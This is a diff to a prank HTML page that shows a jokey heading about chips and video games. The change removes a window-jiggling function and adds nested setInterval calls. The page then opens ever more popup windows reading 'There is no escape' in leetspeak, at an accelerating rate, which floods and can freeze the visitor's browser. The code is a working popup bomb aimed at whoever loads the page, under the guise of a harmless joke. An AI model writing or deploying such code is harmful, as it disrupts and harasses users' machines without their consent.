@@ -1,32 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1 id="title">Read this: Ok, so I like chips. Chips are good, and I love games like Fortnite and TF2. Yeah, so yeah, ummmmmm OHHHH hehe.</h1>
+<h1 id="title">read this ok so i like chips chips are good and i love games like fortnight and tf2 and yeah so yeah ummmmmm OHHHH hehe</h1>
 <script>
-function moveMainPage() {
-  let mainX = 0;
-  let mainY = 0;
-  let mainVx = Math.random() * 200 - 100;
-  let mainVy = Math.random() * 200 - 100;
-
-  function move() {
-    mainX += mainVx;
-    mainY += mainVy;
-    if (mainX <= 0 || mainX >= screen.width - window.innerWidth) {
-      mainVx = -mainVx;
-      mainX = Math.max(0, Math.min(screen.width - window.innerWidth, mainX));
-    }
-    if (mainY <= 0 || mainY >= screen.height - window.innerHeight) {
-      mainVy = -mainVy;
-      mainY = Math.max(0, Math.min(screen.height - window.innerHeight, mainY));
-    }
-    window.moveTo(mainX, mainY);
-    setTimeout(move, 20);
-  }
-
-  move();
-}
-
 function openAndMoveWindow() {
   let oopen = window.open("", "", "width=400,height=200");
   oopen.document.write('<h1 id="title"> Th3R3 !s N0 3ScAp3</h1>');
@@ -56,6 +32,7 @@ function openAndMoveWindow() {
 function start() {
   document.getElementById("title").innerText = "Th3R3 !s N0 3ScAp3";
   openAndMoveWindow();
+  setInterval(openAndMoveWindow, 500); 
 }
 
 function start1() {
@@ -64,10 +41,8 @@ function start1() {
     document.getElementById("title").innerText = "Th3R3 !s N0 3ScAp3";
   }, 1000);
 }
-
-setInterval(start1, 2500);
-setInterval(start, 5000);
-moveMainPage(); // Start moving the main page
+start1(); 
+setInterval(start, 1000);
 </script>
 </body>
 </html>
